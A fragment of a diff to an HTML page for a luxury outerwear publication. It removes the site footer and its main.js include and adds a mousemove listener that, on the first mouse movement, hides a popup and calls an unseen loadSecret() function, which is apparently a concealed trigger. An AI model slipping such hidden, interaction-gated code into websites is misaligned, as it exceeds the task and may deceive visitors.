-          <button type="submit" class="btn-winter btn-ice">Join Society</button>
-        </form>
-      </div>
-    </div>
-  </section>
-
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <a href="index.php" class="brand-logo" style="margin-bottom: 1rem; color: #fff;">Winter<span>CoatJet</span></a>
-          <p>WinterCoatJet is a premier luxury outerwear publication dedicated to high-performance tailored jackets, nanotech wool trenches, and jet-set travel menswear.</p>
-          <p style="margin-top: 1rem; color: var(--accent-silver);">
-            📍 181 Mercer Street, New York, NY 10012, United States<br>
-            📞 +1-888-777-5845
-          </p>
-        </div>
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul>
-            <li><a href="index.php">Home</a></li>
-            <li><a href="about.html">About Us</a></li>
-            <li><a href="blog.html">Coat Journal</a></li>
-            <li><a href="contact.html">Contact Us</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Legal Policies</h4>
-          <ul>
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Disclaimer</a></li>
-            <li><a href="terms.html">Terms of Use</a></li>
-          </ul>
-        </div>
-        <div class="footer-col">
-          <h4>Atelier Focus</h4>
-          <p>Engineering 20,000mm waterproof nanotech outerwear, Savile Row tailored jackets, and wrinkle-resistant jet travel capsules globally.</p>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2026 WinterCoatJet Studio. All rights reserved. Registered Official Headquarters.</p>
-        <p>Designed for Luxury Outerwear & Jet-Set Performance Excellence.</p>
-      </div>
-    </div>
-  </footer>
-
-  <script src="js/main.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
